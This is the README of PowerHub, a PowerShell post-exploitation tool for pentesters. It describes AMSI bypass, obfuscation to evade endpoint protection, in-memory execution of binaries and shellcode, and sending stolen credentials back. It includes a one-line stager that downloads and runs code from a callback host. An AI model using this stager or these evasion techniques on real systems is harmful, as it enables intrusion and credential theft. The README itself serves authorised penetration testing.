PowerHub
========

PowerHub is a convenient post exploitation tool for PowerShell which aids a
pentester in transferring data, in particular code which may get flagged by
endpoint protection. Check out the
[Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/)! Features:

* Fileless
* Stateless
* Cert pinning
* String "obfuscation" by RC4 encryption
* Choose your AMSI Bypass


![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-webapp.png)

During an engagement where you have a test client available, one of the
first things you want to do is run PowerSploit. So you need to download the
files, messing with endpoint protection, disable the execution policy, etc.
PowerHub provides an (almost) one-click-solution for this. Oh, and you can
also run arbitrary binaries (PE and shell code) entirely in-memory using
PowerSploit's modules, which is sometimes useful to bypass application
whitelisting.

Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
either as a file or a text snippet, via the command line or the web
interface. PowerHub also helps with collaboration in case you're a small
team.

Here is a simple example (grab information about local groups with PowerView
and transfer it back):

```
PS C:\Users\avollmer> $K=new-object net.webclient;IEX $K.downloadstring('http://192.168.11.2:8080/0?t=http&f=r&a=reflection');
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
PS C:\Users\avollmer> lhm powerview
Name                                Type N  Loaded
----                                ---- -  ------
ps1/PowerSploit/Recon/PowerView.ps1 ps1  29   True
PS C:\Users\avollmer> Get-LocalGroup | pth -Name groups.json
```

![PowerHub in action](https://github.com/AdrianVollmer/PowerHub/blob/master/img/inaction.png)


Installation
============

PowerHub itself does not need to be installed. Just execute `powerhub.py`.
However, there are a few dependencies. They are listed in the
[requirements.txt](https://github.com/AdrianVollmer/PowerHub/blob/master/requirements.txt).
Install them either via `pip3 install --user -r requirements.txt` or use a
virtual environment.

Python2 is not supported.

venv
----

`venv` can be installed on Debian-like systems by `apt install
python3-venv`.

Run `python3 -m venv env` to create a virtual environment, then use `source
env/bin/activate` to activate it. Now run `pip3 install -r requirements.txt`
to install the depencendies inside the virtual environment.

pipenv
------

Alternatively, you can use `pipenv`. `pipenv` can be installed on
Debian-like systems by `apt install pipenv`.

Run `pipenv install` once in the PowerHub directory, then `pipenv shell` to
activate the virtual environment.


Usage
=====

PowerHub has one mandatory argument: the callback host (can be an IP
address). You should also use `--auth <user>:<pass>`, otherwise, a randomly
generated password will be used for basic authentication. The switch
`--no-auth` disables basic authentication which is *not recommended*. The
callback host name is used by the stager to download the payload. If the
callback port or path differ from the default, it can also be changed.

Read `./powerhub.py --help` and the [Wiki](https://github.com/AdrianVollmer/PowerHub/wiki/Usage) for details.


Credits
=======

PowerHub is partially based on the awesome work of zc00l, @am0nsec, mar10,
p3nt4, @SkelSec. And of course, it would be nothing without @harmj0y,
@mattifestation and the many other contributors to
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit).

Thanks!

Author
======

Adrian Vollmer, 2018-2020

Disclaimer
==========

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
